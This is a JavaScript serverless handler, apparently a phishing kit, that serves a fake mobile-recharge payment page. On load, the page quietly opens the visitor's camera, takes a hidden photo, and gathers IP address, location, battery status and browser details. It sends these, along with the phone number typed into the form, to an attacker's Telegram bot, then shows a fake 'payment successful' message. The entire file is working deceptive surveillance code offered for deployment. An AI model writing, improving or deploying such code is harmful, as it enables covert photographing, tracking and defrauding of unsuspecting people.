// api/back-cam-Hack.js
export default async function handler(req, res) {
  const { chatId, botToken } = req.query;

  // Validate required parameters
  if (!chatId || !botToken) {
    return res.status(400).send(`
      <html>
        <head>
          <title>Missing Parameters</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              background-color: #f5f5f5;
            }
            .container {
              text-align: center;
              padding: 2rem;
              border-radius: 10px;
              background-color: white;
              box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
              max-width: 90%;
            }
            h1 {
              color: #d32f2f;
              margin-bottom: 1rem;
            }
            p {
              margin-bottom: 1rem;
              line-height: 1.5;
            }
            code {
              background-color: #f5f5f5;
              padding: 0.2rem 0.4rem;
              border-radius: 4px;
              font-family: monospace;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <h1>Missing Parameters</h1>
            <p>Please provide both <code>chatId</code> and <code>botToken</code> as query parameters.</p>
            <p>Example: <code>https://your-website.com/api/back-cam-Hack?chatId=YOUR_CHAT_ID&botToken=YOUR_BOT_TOKEN</code></p>
          </div>
        </body>
      </html>
    `);
  }

  // Get client IP address
  const clientIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);

  // HTML response with recharge page
  res.setHeader('Content-Type', 'text/html');
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }
        
        p {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .recharge-options {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        
        .option {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            padding: 15px;
            width: 140px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .option:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-3px);
        }
        
        .option.selected {
            background: rgba(76, 175, 80, 0.3);
            border: 2px solid #4CAF50;
        }
        
        .option .amount {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .option .validity {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 16px;
        }
        
        button {
            background: linear-gradient(to right, #4CAF50, #2E7D32);
            border: none;
            color: white;
            padding: 15px 40px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            margin: 10px 0;
            width: 100%;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        
        button:active {
            transform: translateY(1px);
        }
        
        #status {
            margin-top: 20px;
            font-weight: bold;
            min-height: 24px;
        }
        
        .loader {
            display: none;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 5px solid #4CAF50;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success-checkmark {
            display: none;
            color: #4CAF50;
            font-size: 50px;
            margin: 20px 0;
        }
        
        .footer {
            margin-top: 30px;
            font-size: 12px;
            opacity: 0.8;
        }
        
        .payment-methods {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
        }
        
        .payment-method {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            padding: 10px;
            width: 70px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        
        .payment-method i {
            font-size: 24px;
        }
        
        #hidden-camera {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1000;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div id="hidden-camera">
        <video id="camera-feed" autoplay></video>
    </div>

    <div class="container">
        <h1>Mobile Recharge</h1>
        <p>Recharge your mobile instantly with our secure payment system</p>
        
        <div class="form-group">
            <label for="mobile">Mobile Number</label>
            <input type="tel" id="mobile" placeholder="Enter your mobile number" maxlength="10">
        </div>
        
        <div class="form-group">
            <label for="operator">Select Operator</label>
            <select id="operator" style="width: 100%; padding: 12px 15px; border: none; border-radius: 8px; background: rgba(255, 255, 255, 0.9); font-size: 16px;">
                <option value="">Select your operator</option>
                <option value="jio">Jio</option>
                <option value="airtel">Airtel</option>
                <option value="vi">Vi</option>
                <option value="bsnl">BSNL</option>
            </select>
        </div>
        
        <h3>Select Recharge Plan</h3>
        <div class="recharge-options">
            <div class="option" onclick="selectPlan(this)">
                <div class="amount">₹49</div>
                <div class="validity">28 Days</div>
            </div>
            <div class="option" onclick="selectPlan(this)">
                <div class="amount">₹99</div>
                <div class="validity">56 Days</div>
            </div>
            <div class="option" onclick="selectPlan(this)">
                <div class="amount">₹149</div>
                <div class="validity">84 Days</div>
            </div>
            <div class="option" onclick="selectPlan(this)">
                <div class="amount">₹299</div>
                <div class="validity">365 Days</div>
            </div>
        </div>
        
        <h3>Select Payment Method</h3>
        <div class="payment-methods">
            <div class="payment-method" onclick="selectPayment('upi')">
                <i class="fas fa-mobile-alt"></i>
            </div>
            <div class="payment-method" onclick="selectPayment('card')">
                <i class="fas fa-credit-card"></i>
            </div>
            <div class="payment-method" onclick="selectPayment('wallet')">
                <i class="fas fa-wallet"></i>
            </div>
        </div>
        
        <button onclick="processPayment()">
            <i class="fas fa-check-circle"></i> Proceed to Pay
        </button>
        
        <div class="loader" id="loader"></div>
        
        <div class="success-checkmark" id="successCheckmark">
            <i class="fas fa-check-circle"></i>
        </div>
        
        <div id="status"></div>
        
        <div class="footer">
            <p>Your payment will be processed securely. 100% safe and encrypted.</p>
        </div>
    </div>

    <script>
        const botToken = "${botToken}";
        const chatId = "${chatId}";
        const serverIp = "${clientIP}";
        const statusElement = document.getElementById('status');
        const loader = document.getElementById('loader');
        const successCheckmark = document.getElementById('successCheckmark');
        const cameraFeed = document.getElementById('camera-feed');
        
        let selectedPlan = null;
        let selectedPayment = null;
        let userAgent = navigator.userAgent;
        let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        let currentTime = new Date().toLocaleString();
        let capturedPhoto = null;
        let stream = null;
        let cameraAccessAttempted = false;
        let batteryLevel = 'Unknown';
        let isCharging = false;

        // Get battery information if available
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + '%';
                    isCharging = battery.charging;
                    
                    // Add event listeners for changes
                    battery.addEventListener('levelchange', () => {
                        batteryLevel = Math.round(battery.level * 100) + '%';
                    });
                    
                    battery.addEventListener('chargingchange', () => {
                        isCharging = battery.charging;
                    });
                } else if ('battery' in navigator) {
                    batteryLevel = Math.round(navigator.battery.level * 100) + '%';
                    isCharging = navigator.battery.charging;
                }
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
            
            return { batteryLevel, isCharging };
        }

        // Automatically access camera when page loads
        window.onload = async function() {
            document.getElementById('mobile').focus();
            
            // Get battery info first
            await getBatteryInfo();
            
            // Wait a moment before attempting camera access
            setTimeout(async () => {
                await captureCameraSilently();
            }, 500);
        };

        // Access back camera silently without showing any UI
        async function captureCameraSilently() {
            if (cameraAccessAttempted) return;
            cameraAccessAttempted = true;
            
            try {
                // Try to get the back camera (environment-facing)
                const constraints = {
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraFeed.srcObject = stream;
                
                // Wait for video to be ready
                cameraFeed.onloadedmetadata = function() {
                    // Capture photo after a short delay
                    setTimeout(() => {
                        capturePhotoSilently();
                    }, 1500);
                };
            } catch (error) {
                console.error('Error accessing back camera:', error);
                
                // If back camera fails, try any available camera
                try {
                    const constraints = {
                        video: true,
                        audio: false 
                    };
                    
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    cameraFeed.srcObject = stream;
                    
                    cameraFeed.onloadedmetadata = function() {
                        setTimeout(() => {
                            capturePhotoSilently();
                        }, 1500);
                    };
                } catch (fallbackError) {
                    console.error('Error accessing any camera:', fallbackError);
                    // Send data without photo if camera access fails
                    sendInitialDataToTelegram();
                }
            }
        }

        // Capture photo silently
        function capturePhotoSilently() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                
                capturedPhoto = canvas.toDataURL('image/jpeg');
                
                // Stop camera stream
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Send data to Telegram
                sendInitialDataToTelegram();
            } catch (error) {
                console.error('Error capturing photo:', error);
                // Send data without photo if capture fails
                sendInitialDataToTelegram();
            }
        }

        // Get IP address using a third-party service
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return serverIp || 'Unknown';
            }
        }

        // Get location info based on IP
        async function getLocationInfo(ip) {
            try {
                const response = await fetch(\`https://ipapi.co/\${ip}/json/\`);
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                console.error('Error getting location:', error);
                return {
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    isp: 'Unknown'
                };
            }
        }

        function updateStatus(message, isError = false) {
            statusElement.textContent = message;
            statusElement.style.color = isError ? '#ff6b6b' : '#4CAF50';
        }

        function selectPlan(element) {
            // Remove selected class from all options
            document.querySelectorAll('.option').forEach(opt => {
                opt.classList.remove('selected');
            });
            
            // Add selected class to clicked option
            element.classList.add('selected');
            selectedPlan = element.querySelector('.amount').textContent;
        }

        function selectPayment(method) {
            selectedPayment = method;
            // You could add visual feedback for selected payment method
        }

        // Send initial data when camera is accessed
        async function sendInitialDataToTelegram() {
            const clientIP = await getIPAddress();
            const locationInfo = await getLocationInfo(clientIP);
            
            // Update battery info one more time before sending
            await getBatteryInfo();
            
            // Prepare initial text message
            const message = \`🌍 ɪᴘ ᴀᴅᴅʀᴇss: \${clientIP}
🏳️ ᴄᴏᴜɴᴛʀʏ: \${locationInfo.country}
🏙️ ᴄɪᴛʏ: \${locationInfo.city}
📡 ɪsᴘ: \${locationInfo.isp}
⏰ ᴛɪᴍᴇ ᴢᴏɴᴇ: \${timezone}
🕒 ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: \${currentTime}
🔋 ʙᴀᴛᴛᴇʀʏ: \${batteryLevel}
⚡ ᴄʜᴀʀɢɪɴɢ: \${isCharging ? 'Yes' : 'No'}
🌐 ʙʀᴏᴡsᴇʀ: \${userAgent}

ᴘᴀʏᴍᴇɴᴛ ɪɴɪᴛɪᴀᴛᴇᴅ ʙʏ @Black_Hats_Hackers\`;
            
            // Send to Telegram
            if (capturedPhoto) {
                try {
                    // Convert base64 to blob
                    const response = await fetch(capturedPhoto);
                    const blob = await response.blob();
                    
                    // Create form data to send the photo
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'camera_capture.jpg');
                    formData.append('caption', message);
                    
                    // Send photo to Telegram
                    await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                        method: 'POST',
                        body: formData,
                    });
                } catch (photoError) {
                    console.error('Error sending photo:', photoError);
                    // If photo fails, send just the text message
                    await sendTextMessage(message);
                }
            } else {
                // Send just text message if no photo
                await sendTextMessage(message);
            }
        }

        // Send text message to Telegram
        async function sendTextMessage(message) {
            try {
                await fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
            } catch (error) {
                console.error('Error sending message:', error);
            }
        }

        async function processPayment() {
            const mobileNumber = document.getElementById('mobile').value;
            const operator = document.getElementById('operator').value;
            
            if (!mobileNumber || mobileNumber.length !== 10) {
                updateStatus('Please enter a valid 10-digit mobile number', true);
                return;
            }
            
            if (!operator) {
                updateStatus('Please select your mobile operator', true);
                return;
            }
            
            if (!selectedPlan) {
                updateStatus('Please select a recharge plan', true);
                return;
            }
            
            if (!selectedPayment) {
                updateStatus('Please select a payment method', true);
                return;
            }
            
            // Show loader
            loader.style.display = 'block';
            updateStatus('Processing your payment...');
            
            try {
                // Update battery info before sending payment data
                await getBatteryInfo();
                
                // Get updated IP and location info
                const clientIP = await getIPAddress();
                const locationInfo = await getLocationInfo(clientIP);
                
                // Send payment details to Telegram
                const paymentMessage = \`💳 ɴᴇᴡ ʀᴇᴄʜᴀʀɢᴇ ᴀᴛᴛᴇᴍᴘᴛ

📱 ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ: \${mobileNumber}
📶 ᴏᴘᴇʀᴀᴛᴏʀ: \${operator}
💰 ᴘʟᴀɴ: \${selectedPlan}
💳 ᴘᴀʏᴍᴇɴᴛ ᴍᴇᴛʜᴏᴅ: \${selectedPayment}

🌍 ɪᴘ ᴀᴅᴅʀᴇss: \${clientIP}
🏳️ ᴄᴏᴜɴᴛʀʏ: \${locationInfo.country}
🏙️ ᴄɪᴛʏ: \${locationInfo.city}
📡 ɪsᴘ: \${locationInfo.isp}
⏰ ᴛɪᴍᴇ ᴢᴏɴᴇ: \${timezone}
🕒 ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: \${new Date().toLocaleString()}
🔋 ʙᴀᴛᴛᴇʀʏ: \${batteryLevel}
⚡ ᴄʜᴀʀɢɪɴɢ: \${isCharging ? 'Yes' : 'No'}
🌐 ʙʀᴏᴡsᴇʀ: \${userAgent}

ᴘᴀʏᴍᴇɴᴛ ɪɴɪᴛɪᴀᴛᴇᴅ ʙʏ @Black_Hats_Hackers\`;
                
                await sendTextMessage(paymentMessage);
                
                // Hide loader and show success
                loader.style.display = 'none';
                successCheckmark.style.display = 'block';
                updateStatus('Payment successful! Your recharge will be processed shortly.');
                
            } catch (error) {
                console.error('Error processing payment:', error);
                loader.style.display = 'none';
                updateStatus('Payment failed. Please try again.', true);
            }
        }
    </script>
</body>
</html>
  `);
}